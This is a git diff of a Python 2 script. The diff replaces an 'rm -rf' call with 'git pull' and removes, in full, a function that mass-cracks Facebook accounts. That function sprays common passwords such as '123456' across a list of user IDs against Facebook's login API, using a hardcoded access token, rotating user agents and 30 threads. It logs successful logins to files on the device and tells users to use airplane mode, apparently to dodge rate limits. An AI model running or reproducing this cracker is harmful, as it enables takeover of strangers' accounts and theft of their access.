@@ -2,7 +2,7 @@
 
 import requests,bs4,sys,os,subprocess
 import requests,sys,random,time,re,base64,json
-os.system('rm -rf .txt')
+os.system('git pull')
 def psb(z):
     for e in z + '\n':
         sys.stdout.write(e)
@@ -70,71 +70,4 @@ $$$$$$$/  $$$$$$$$/     $/     $$$$$$/ $$$$$$$$/
 os.system('clear')
 print logo
 print 48 * '\x1b[1;91m~'
-def ran():
-    id=[]
-    cps=[]
-    oks=[]
-    os.system("clear")
-    print(logo)
-    print("")
-    print("")
-    k = '100000'
-    try:
-        idlist = '.txt'
-        for line in open(idlist, 'r').readlines():
-            id.append(line.strip())
-    except:
-        exit(" An error has occured")
-    os.system("clear")
-    print logo
-    print 48 * '\x1b[1;91m~'
-    print('\x1b[1;91m   USE (AIRPLANE) MODE BEFORE USE')
-    print 48 * '\x1b[1;91m~'
-    xxx = str(len(id))
-    print('\x1b[1;92m   TOTAL IDS :\x1b[1;92m ' + xxx)
-    print('\x1b[1;92m   UID ACCOUNT CRACKING STARTED....')
-    print 48 * '\x1b[1;91m~'
-    os.system('xdg-open  https://facebook.com/groups/3161198854092643/')
-    def main(arg):
-        user=arg
-        sharagent = random.choice(sua)
-        ses = requests.Session()
-        ses.headers.update({'User-Agent': sharagent})
-        try:
-            pass1 = '123456'
-            data = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+user+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-            s = json.loads(data)
-            if "access_token" in s:
-                print('\033[1;92m[OK] '+k+user+' | '+pass1+'\033[1;92m')
-                ok = open('/sdcard/DV_OK.txt', 'a')
-                ok.write(k+user+'|'+pass1+'\n')
-                ok.close()
-                oks.append(c + user + pass1)
-            else:
-                if "www.facebook.com" in s["error_msg"]:
-                    print(' \x1b[1;91m [CP] '+k+user+' | '+pass1+'\033[1;91m')
-                    cp = open('/sdcard/DV_CP.txt', 'a')
-                    cp.write(k+user+'|'+pass1+'\n')
-                    cp.close()
-                    cps.append(c + user + pass1)
-                else:
-                    pass2 = '123456789'
-                    data = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+user+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
-                    s = json.loads(data)
-                    if "access_token" in s:
-                        print(' \033[1;92m[OK] '+k+user+' | '+pass2+'\033[1;92m')
-                        ok = open('/sdcard/DV_OK.txt', 'a')
-                        ok.write(k+user+'|'+pass2+'\n')
-                        ok.close()
-                        oks.append(c + user + pass2)
-        except:
-            pass
-    p = ThreadPool(30)
-    p.map(main, id)
-    print ("\x1b[1;91m[!]\x1b[1;97m Process has been complete")
-    print ("\x1b[1;92m[!]\x1b[1;92m Total OK  "+str(len(oks)))
-    print ("\x1b[1;91m[!]\x1b[1;91m Total CP  "+str(len(cps)))
-    raw_input("\x1b[1;97m Press enter to back Menu ")
-    ran()
-    
-ran()
+
